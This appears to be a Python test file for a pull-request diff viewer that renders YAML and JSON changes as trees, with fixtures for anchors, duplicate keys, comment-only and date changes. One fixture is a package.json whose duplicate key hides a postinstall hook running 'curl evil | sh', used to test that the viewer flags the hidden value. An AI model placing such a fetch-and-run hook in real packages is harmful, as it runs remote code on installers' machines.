"""The rendered YAML and JSON session runs production browser code on the server's trees.

``tests/dom/diff-structured-session.js`` loads ``builtin_plugins/diff/diff-structured.js``,
``diff-markdown.js`` and the structured plugin's ``preview.js`` and ``tree.js`` whole, and
mounts each file through the page's views as a pull request's Changes does: which rows a
merged tree has, which open first, what a click opens and closes, how each row is marked,
and the chooser, refusal and disposal around it. ``tests/golden/cli-ui-diff-structured.tryscript.md``
pins its transcript. So that the trees are the server's and not ones a test wrote by hand,
they come from ``tests/fixtures/diff-structured-responses.json``: what
:func:`metabrowser.diff.structured_projection.project_structured_diff` answers for these
files. The route itself, admission and refusals included, is pinned by
``tests/golden/cli-github-pull-rendered-structured.txt``. The first test fails when the recording no
longer matches; ``make golden-update`` rewrites it and then the transcript.
"""

from __future__ import annotations

from typing import Any

from metabrowser.diff.structured_projection import Format, project_structured_diff
from tests.golden_harness import check_recording, run_session

_RECORDING = "diff-structured-responses.json"

_CONFIG_OLD = b"""\
name: demo
version: 3
services:
  web:
    image: nginx
    ports: [80]
  db:
    image: postgres
    port: 5432
flags:
  - fast
  - safe
"""
_CONFIG_NEW = b"""\
name: demo
version: 4
services:
  web:
    image: nginx
    ports: [80, 443]
flags:
  - fast
  - safe
"""
# An alias reads as the value it names, so both keys changed.
_ANCHORS_OLD = b"base: &base {replicas: 1}\nworker: *base\n"
_ANCHORS_NEW = b"base: &base {replicas: 2}\nworker: *base\n"
# A key twice in one mapping is refused, so the file shows only Source.
_DUPLICATE_OLD = b"replicas: 1\n"
_DUPLICATE_NEW = b"replicas: 1\nreplicas: 2\n"
# Only a comment changed: the tree shows no change, and the page says Source does.
_COMMENTS_OLD = b"# settings\nmode: fast\nretries: 3\n"
_COMMENTS_NEW = b"# the service's settings\nmode: fast\nretries: 3\n"
# A date became the string that spells it beside a drawn change: the page says Source
# shows a change the tree draws as unchanged.
_DATES_OLD = b"released: 2026-11-18\nretries: 3\n"
_DATES_NEW = b'released: "2026-11-18"\nretries: 4\n'
# An added JSON file that writes a key twice: the tree draws the last value, and the page
# says Source shows the value it hides.
_HIDING = b'{"scripts": {"postinstall": "curl evil | sh"}, "name": "demo", "scripts": {}}\n'


def _answer(old: bytes | None, new: bytes | None, fmt: Format) -> dict[str, Any]:
    return dict(project_structured_diff(old=old, new=new, fmt=fmt))


def _recording() -> dict[str, Any]:
    return {
        "config/app.yaml": _answer(_CONFIG_OLD, _CONFIG_NEW, "yaml"),
        "package.json": _answer(None, b'{"name": "demo", "scripts": {"test": "make"}}\n', "json"),
        "data/swap.json": _answer(b"[1, 2]\n", b'"text"\n', "json"),
        "deploy/anchors.yaml": _answer(_ANCHORS_OLD, _ANCHORS_NEW, "yaml"),
        "deploy/duplicate.yaml": _answer(_DUPLICATE_OLD, _DUPLICATE_NEW, "yaml"),
        "config/comments.yaml": _answer(_COMMENTS_OLD, _COMMENTS_NEW, "yaml"),
        "config/dates.yaml": _answer(_DATES_OLD, _DATES_NEW, "yaml"),
        "tools/package.json": _answer(None, _HIDING, "json"),
    }


def test_recording_matches_the_production_projection() -> None:
    recording = _recording()
    assert {path: answer["status"] for path, answer in recording.items()} == {
        **dict.fromkeys(recording, "ready"),
        "deploy/duplicate.yaml": "unsupported",
    }
    assert recording["config/comments.yaml"]["source_only"] is True
    assert recording["config/dates.yaml"]["source_only"] is True
    assert recording["tools/package.json"]["source_only"] is True
    check_recording(_RECORDING, recording, transcript="cli-ui-diff-structured.tryscript.md")


def test_session_replays_the_recording() -> None:
    transcript = run_session("diff-structured-session.js")
    first, *_ = transcript["steps"]
    assert first["renderer asked before the first answer"] == 1
    assert first["renderer asked in all"] == 1
    files = first["files"]
    config = files["config/app.yaml"]
    assert config["chooser"] == "YAML diff format: *Rendered | Source"
    assert config["shows"] == "rendered"
    assert "  removed leaf version: 3" in config["rows"]
    assert "  added leaf version: 4" in config["rows"]
    assert '  context closed flags: ["fast", "safe"]' in config["rows"]
    assert files["package.json"]["chooser"] == "JSON diff format: *Rendered | Source"
    assert files["data/swap.json"]["rows"][0].startswith("removed open")
    assert files["deploy/anchors.yaml"]["shows"] == "rendered"
    assert files["deploy/duplicate.yaml"] == {
        "chooser": "YAML diff format: Rendered | *Source",
        "shows": "source",
    }
    comments = files["config/comments.yaml"]["rows"]
    assert comments[0] == "note: The tree shows no change. Source shows what changed in the text."
    assert comments[1].startswith("context closed ")
    dates = files["config/dates.yaml"]["rows"]
    assert dates[0] == "note: Source shows a change the tree draws as unchanged."
    by_step = {step["step"]: step for step in transcript["steps"]}
    missing = by_step[
        "a tree renderer that failed to load leaves the file in Source, its chooser kept"
    ]
    assert missing["files"]["config/app.yaml"] == {
        "chooser": "YAML diff format: Rendered | *Source",
        "shows": "source",
    }
    assert by_step["disposal removes each tree's click listener"]["listeners"] == 0
